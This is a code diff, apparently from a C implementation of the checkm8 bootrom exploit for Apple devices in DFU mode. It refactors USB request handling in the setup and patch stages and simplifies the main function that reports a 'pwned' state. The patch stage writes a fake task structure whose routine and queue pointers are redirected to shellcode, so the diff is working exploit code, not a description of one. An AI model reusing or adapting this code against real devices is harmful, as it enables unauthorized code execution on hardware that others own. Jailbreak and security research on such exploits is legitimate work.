@@ -280,18 +280,6 @@ checkm8_stage_reset(const handle_t *handle) {
 }
 
 static kern_return_t
-usb_get_status(const handle_t *handle, void *data, UInt16 len) {
-	UInt16 i;
-
-	for(i = 0; i < len; i += EP0_MAX_PACKET_SZ) {
-		if(send_usb_device_request(handle, USBmakebmRequestType(kUSBOut, kUSBStandard, kUSBDevice), kUSBRqGetStatus, 0, 0, (UInt8 *)data + i, EP0_MAX_PACKET_SZ) != kIOUSBPipeStalled) {
-			return KERN_FAILURE;
-		}
-	}
-	return KERN_SUCCESS;
-}
-
-static kern_return_t
 checkm8_stage_setup(const handle_t *handle) {
 	dfu_overwrite_t overwrite;
 	transfer_t transfer;
@@ -303,7 +291,7 @@ checkm8_stage_setup(const handle_t *handle) {
 		}
 		CFRunLoopRun();
 		if(transfer.ret == kIOReturnAborted && transfer.sz <= sizeof(overwrite.extra)) {
-			if(usb_get_status(handle, &overwrite, (UInt16)(offsetof(dfu_overwrite_t, synopsys_task.callout) - transfer.sz)) != KERN_SUCCESS) {
+			if(send_usb_device_request(handle, USBmakebmRequestType(kUSBOut, kUSBStandard, kUSBDevice), kUSBRqGetStatus, 0, 0, &overwrite, (UInt16)(offsetof(dfu_overwrite_t, synopsys_task.callout) - transfer.sz)) != kIOUSBPipeStalled) {
 				break;
 			}
 			return send_usb_device_request_async(handle, USBmakebmRequestType(kUSBOut, kUSBClass, kUSBInterface), DFU_CLR_STATUS, 0, 0, NULL, 0, NULL);
@@ -383,7 +371,7 @@ checkm8_stage_patch(const handle_t *handle) {
 	overwrite.fake_task.routine = overwrite.fake_task.stack_base + offsetof(dfu_task_t, arch.shc);
 	overwrite.fake_task.queue_list.prev = overwrite.fake_task.queue_list.next = handle->io_buffer_addr + offsetof(dfu_task_t, ret_waiters_list);
 	overwrite.fake_task.ret_waiters_list.prev = overwrite.fake_task.ret_waiters_list.next = overwrite.fake_task.stack_base + offsetof(dfu_task_t, ret_waiters_list);
-	if(usb_get_status(handle, &overwrite.synopsys_task.callout, sizeof(overwrite) - offsetof(dfu_overwrite_t, synopsys_task.callout)) == KERN_SUCCESS) {
+	if(send_usb_device_request(handle, USBmakebmRequestType(kUSBOut, kUSBStandard, kUSBDevice), kUSBRqGetStatus, 0, 0, &overwrite.synopsys_task.callout, sizeof(overwrite) - offsetof(dfu_overwrite_t, synopsys_task.callout)) == kIOUSBPipeStalled) {
 		return send_usb_device_request_async(handle, USBmakebmRequestType(kUSBOut, kUSBClass, kUSBInterface), DFU_CLR_STATUS, 0, 0, NULL, 0, NULL);
 	}
 	return KERN_FAILURE;
@@ -464,15 +452,11 @@ eclipsa(handle_t *handle) {
 
 int
 main(void) {
-	int ret = EXIT_FAILURE;
 	handle_t handle;
 
 	handle.pid = DFU_MODE_PID;
 	handle.stage = STAGE_RESET;
 	handle.vid = kAppleVendorID;
 	eclipsa(&handle);
-	if(handle.stage == STAGE_PWNED) {
-		ret = 0;
-	}
-	return ret;
+	return handle.stage == STAGE_PWNED ? 0 : EXIT_FAILURE;
 }
